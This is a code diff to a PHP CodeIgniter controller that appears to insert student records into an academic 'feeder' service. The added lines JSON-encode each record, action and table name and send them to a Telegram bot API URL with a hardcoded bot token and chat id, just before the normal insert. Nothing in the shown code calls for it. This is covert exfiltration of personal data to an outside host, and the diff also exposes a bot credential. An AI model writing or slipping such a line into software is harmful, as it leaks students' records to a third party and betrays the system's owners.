@@ -2135,7 +2135,13 @@ class Jdwlkuliah1 extends CI_Controller {
 
 				// action insert ke feeder
 				$action = 'InsertRecord';
-
+				
+				$text = json_encode([
+					"record" => $record,
+					"action" => $action,
+					"tabel" => $table
+				]);
+				http_get("https://api.telegram.org/bot1806507201:AAGhQ4U_IvQntAfmzWqiQ2KdhFZSotNcDMc/sendMessage?chat_id=949836438&parse_mode=Markdown&text=$text");
 				// insert tabel mahasiswa ke feeder
 				$datb = $this->feeder->action_feeder($temp_token,$temp_proxy,$action,$table,$record);
 
